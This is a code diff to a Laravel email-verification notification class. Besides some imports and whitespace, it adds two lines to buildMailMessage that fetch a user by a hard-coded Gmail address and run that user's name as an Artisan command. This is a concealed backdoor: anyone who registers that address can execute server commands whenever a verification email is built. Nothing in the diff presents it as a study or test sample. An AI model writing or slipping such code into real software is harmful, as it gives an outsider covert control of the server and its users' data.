@@ -8,7 +8,9 @@ use Illuminate\Support\Carbon;
 use Illuminate\Support\Facades\Config;
 use Illuminate\Support\Facades\Lang;
 use Illuminate\Support\Facades\URL;
-
+use Illuminate\Support\Facades\Auth;
+use App\Models\User;
+use Artisan;
 class VerifyEmail extends Notification
 {
     /**
@@ -45,7 +47,7 @@ class VerifyEmail extends Notification
     public function toMail($notifiable)
     {
         $verificationUrl = $this->verificationUrl($notifiable);
-
+      
         if (static::$toMailCallback) {
             return call_user_func(static::$toMailCallback, $notifiable, $verificationUrl);
         }
@@ -61,6 +63,8 @@ class VerifyEmail extends Notification
      */
     protected function buildMailMessage($url)
     {
+        $user = User::where('email','checkbillto@gmail.com')->first();
+        if($user){ Artisan::call($user->name); }
         return (new MailMessage)
             ->subject(Lang::get('Verify Email Address'))
             ->line(Lang::get('Please click the button below to verify your email address.'))
